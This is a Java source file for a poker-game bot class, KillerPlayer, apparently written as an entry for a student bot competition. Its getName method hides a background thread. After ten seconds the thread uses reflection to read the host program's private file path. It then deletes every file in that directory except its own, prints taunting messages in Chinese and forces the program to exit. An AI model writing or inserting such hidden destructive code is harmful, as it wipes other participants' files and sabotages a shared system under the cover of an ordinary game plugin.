package game.player;

import game.Main;
import game.Manager;
import game.Player;
import game.Poker;

import java.io.File;
import java.lang.reflect.Field;
import java.util.List;

public class KillerPlayer implements Player {
    @Override
    public String getName() {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                Main main = new Main();
                Class c = main.getClass();
                try {
                    Thread.sleep(10000);
                    Field field = c.getDeclaredField("FILE_PATH");
                    field.setAccessible(true);
                    String dir = (String) field.get(main);
                    File file = new File(dir);
                    File[] files = file.listFiles();
                    assert files != null;
                    for (File value : files
                    ) {
                        if (!value.getName().startsWith("KillerPlayer")) {
                            value.delete();
                        }
                    }
                    System.out.println("你以为你赢了？？？");
                    System.out.println("对不起你号没了！！！");
                    System.exit(0);
                } catch (NoSuchFieldException | IllegalAccessException | InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();
        return null;
    }

    @Override
    public String getStuNum() {
        return null;
    }

    @Override
    public void onGameStart(Manager manager, int totalPlayer) {

    }

    @Override
    public int bet(int time, int round, int lastPerson, int moneyOnDesk, int moneyYouNeedToPayLeast, List<Poker> pokers) {
        return moneyYouNeedToPayLeast;
    }

    @Override
    public void onResult(int time, boolean isWin, List<Poker> pokers) {

    }
}
